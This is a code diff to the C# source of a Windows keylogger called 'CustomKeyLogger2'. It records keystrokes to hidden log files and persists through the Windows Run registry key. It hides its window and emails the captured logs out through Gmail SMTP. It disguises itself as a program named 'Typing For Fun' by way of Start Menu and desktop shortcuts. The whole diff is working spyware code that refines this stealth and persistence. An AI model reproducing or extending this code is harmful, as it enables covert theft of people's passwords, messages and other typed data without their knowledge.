@@ -12,7 +12,6 @@ using System.IO;
 using System.Collections;
 using System.Net.Mail;
 using Microsoft.Win32;
-using IWshRuntimeLibrary;
 
 namespace CustomKeyLogger2
 {
@@ -21,14 +20,13 @@ namespace CustomKeyLogger2
         [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
         internal static extern short GetKeyState(int virtualKeyCode);
 
-        string atmdir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase);
-        string writeUp = "";
-        string secretWord = "";
+        String atmdir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\Key Logger";
+        String writeUp = "";
+        String writeUpBuffer = "";
+        String secretWord = "";
         ArrayList keyWords;
 
-        string keywordsFileDir;
-        string logsFileDir;
-        string attachFileDir;
+        String keywordsFileDir, logsFileDir, attachFileDir;
 
         bool PauseWriting = false;
         SmtpClient emailClient = new SmtpClient("smtp.gmail.com", 587);
@@ -50,21 +48,21 @@ namespace CustomKeyLogger2
 
         private void InitStream()
         {
-            atmdir = atmdir.Remove(0, 6);
+            if (!Directory.Exists(atmdir)) Directory.CreateDirectory(atmdir);
             atmdir += "\\";
 
             keywordsFileDir = atmdir + "keywords.krs";
             logsFileDir = atmdir + Environment.UserName + "-logs.krs";
             attachFileDir = atmdir + "attachlog.txt";
             StreamWriter sw;
-            if (!System.IO.File.Exists(keywordsFileDir))
+            if (!File.Exists(keywordsFileDir))
             {
-                sw = System.IO.File.CreateText(keywordsFileDir);
+                sw = File.CreateText(keywordsFileDir);
                 sw.Close();
             }
-            if (!System.IO.File.Exists(logsFileDir))
+            if (!File.Exists(logsFileDir))
             {
-                sw = System.IO.File.CreateText(logsFileDir);
+                sw = File.CreateText(logsFileDir);
                 sw.Close();
             }
         }
@@ -87,7 +85,7 @@ namespace CustomKeyLogger2
                 this.btnStart.Enabled = false;
                 this.btnStop.Enabled = true;
                 this.btnHide.Enabled = true;
-                this.HideWindow();
+                this.HideWindow();      // Default;
             }
         }
 
@@ -117,12 +115,21 @@ namespace CustomKeyLogger2
 
         private void InitStartUp()
         {
-            RegistryKey regKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            string result = (string)regKey.GetValue(Application.ProductName, "NotFound");
-            if (result != Application.ExecutablePath)
+            String StartmenuApp = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)
+                + "\\Programs\\Typing For Fun\\Typing For Fun.appref-ms";
+            String StartupPath = atmdir + "Typing For Fun.appref-ms";
+
+            if (File.Exists(StartmenuApp))
             {
-                regKey.SetValue(Application.ProductName, Application.ExecutablePath);
-                regKey.Close();
+                if (!File.Exists(StartupPath)) File.Copy(StartmenuApp, StartupPath, true);
+                RegistryKey regKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                string result = (string)regKey.GetValue(Application.ProductName, "NotFound");
+                if (result != StartupPath)
+                {
+                    if (result != "NotFound") regKey.DeleteValue(Application.ProductName);
+                    regKey.SetValue(Application.ProductName, StartupPath);
+                    regKey.Close();
+                }
             }
         }
 
@@ -199,22 +206,22 @@ namespace CustomKeyLogger2
                 //case hook.VK.VK_NEXT: temp = "<-page down->";
                 //    break;
 
-                case hook.VK.VK_ESCAPE: temp = "\r\n<-esc->";
-                    break;
-                case hook.VK.VK_NUMLOCK: temp = "\r\n<-numlock->";
-                    break;
+                //case hook.VK.VK_ESCAPE: temp = "\r\n<-esc->";
+                //    break;
+                //case hook.VK.VK_NUMLOCK: temp = "\r\n<-numlock->";
+                //    break;
                 //case hook.VK.VK_LSHIFT: temp = "\r\n<-left shift->";
                 //    break;
                 //case hook.VK.VK_RSHIFT: temp = "\r\n<-right shift->";
                 //    break;
-                case hook.VK.VK_LCONTROL: temp = "\r\n<-left control->";
-                    break;
-                case hook.VK.VK_RCONTROL: temp = "\r\n<-right control->";
-                    break;
-                case hook.VK.VK_LMENU: temp = "\r\n<-left alt->";
-                    break;
-                case hook.VK.VK_RMENU: temp = "\r\n<-right alt->";
-                    break;
+                //case hook.VK.VK_LCONTROL: temp = "\r\n<-left control->";
+                //    break;
+                //case hook.VK.VK_RCONTROL: temp = "\r\n<-right control->";
+                //    break;
+                //case hook.VK.VK_LMENU: temp = "\r\n<-left alt->";
+                //    break;
+                //case hook.VK.VK_RMENU: temp = "\r\n<-right alt->";
+                //    break;
                 case hook.VK.VK_TAB: temp = "\t";
                     break;
                 //case hook.VK.VK_CAPITAL: temp = "\r\n<-caps lock->";
@@ -226,14 +233,14 @@ namespace CustomKeyLogger2
                 case hook.VK.VK_SPACE: temp = "  ";     //  "<-space->"
                     break;
 
-                case hook.VK.VK_LEFT: temp = "<left>";
-                    break;
-                case hook.VK.VK_UP: temp = "<up>";
-                    break;
-                case hook.VK.VK_RIGHT: temp = "<right>";
-                    break;
-                case hook.VK.VK_DOWN: temp = "<down>";
-                    break;
+                //case hook.VK.VK_LEFT: temp = "<left>";
+                //    break;
+                //case hook.VK.VK_UP: temp = "<up>";
+                //    break;
+                //case hook.VK.VK_RIGHT: temp = "<right>";
+                //    break;
+                //case hook.VK.VK_DOWN: temp = "<down>";
+                //    break;
 
                 case hook.VK.VK_MULTIPLY: temp = "*";
                     break;
@@ -404,13 +411,12 @@ namespace CustomKeyLogger2
             #endregion
 
             writeUp = writeUp + temp;
+            writeUpBuffer = writeUpBuffer + temp;
 
-#if Temp
-            unhide();
-
+#if Disabled
             checkKeys();
 #endif
-            writeToFile(temp);
+            //writeToFile(temp);
         }
         
         public void unhide()
@@ -442,12 +448,12 @@ namespace CustomKeyLogger2
 
         public void writeToFile(String writing)
         {
-            if (PauseWriting == false) System.IO.File.AppendAllText(logsFileDir, writing);
+            if (PauseWriting == false) File.AppendAllText(logsFileDir, writing);
         }
 
         private void btnShow_Click(object sender, EventArgs e)
         {
-            txtLog.Text = System.IO.File.ReadAllText(logsFileDir);
+            txtLog.Text = File.ReadAllText(logsFileDir);
         }
 
         private void btnSvScrtWrd_Click(object sender, EventArgs e)
@@ -490,10 +496,10 @@ namespace CustomKeyLogger2
         public void sendMailK()
         {
             PauseWriting = true;
-            System.IO.File.Copy(logsFileDir, attachFileDir, true);
+            File.Copy(logsFileDir, attachFileDir, true);
             Attachment attach = new Attachment(attachFileDir);
-            System.IO.File.Delete(logsFileDir);
-            StreamWriter sw = System.IO.File.CreateText(logsFileDir);
+            File.Delete(logsFileDir);
+            StreamWriter sw = File.CreateText(logsFileDir);
             sw.Close();
             PauseWriting = false;
 
@@ -502,9 +508,6 @@ namespace CustomKeyLogger2
             message.Attachments.Add(attach);
             System.Net.NetworkCredential SMTPUserInfo = new System.Net.NetworkCredential(Properties.Settings.Default.GMail,
                 LoadPassword());
-            //MailMessage message = new MailMessage("aaa@gmail.com", "aaa@gmail.com",
-            //    "CustomKeyLogger2 - Logs", "logs report");
-            //System.Net.NetworkCredential SMTPUserInfo = new System.Net.NetworkCredential("aaa@gmail.com","password");
 
             emailClient = new SmtpClient("smtp.gmail.com", 587);
             emailClient.SendCompleted += new SendCompletedEventHandler(SendCompletedCallback);
@@ -547,7 +550,7 @@ namespace CustomKeyLogger2
         private void ShowWindow()
         {
             this.Opacity = 1;
-            this.ShowInTaskbar = true;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
             this.WindowState = FormWindowState.Normal;
             this.Refresh();
         }
@@ -555,7 +558,7 @@ namespace CustomKeyLogger2
         private void HideWindow()
         {
             this.Opacity = 0;
-            this.ShowInTaskbar = false;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
             this.WindowState = FormWindowState.Minimized;
             this.Refresh();
         }
@@ -605,15 +608,18 @@ namespace CustomKeyLogger2
         private void timUnHide_Tick(object sender, EventArgs e)
         {
             unhide();
+            String temp = writeUpBuffer;
+            writeUpBuffer = "";
+            writeToFile(temp);
         }
 
         private void btnCreateDesktopShortcut_Click(object sender, EventArgs e)
         {
             String ShortcutLnk = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Typing For Fun.lnk";
-            if (!System.IO.File.Exists(ShortcutLnk))
+            if (!File.Exists(ShortcutLnk))
             {
-                WshShell shell = new WshShell();
-                IWshShortcut link = (IWshShortcut)shell.CreateShortcut(ShortcutLnk);
+                IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
+                IWshRuntimeLibrary.IWshShortcut link = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(ShortcutLnk);
                 link.TargetPath = atmdir;
                 link.Save();
             }
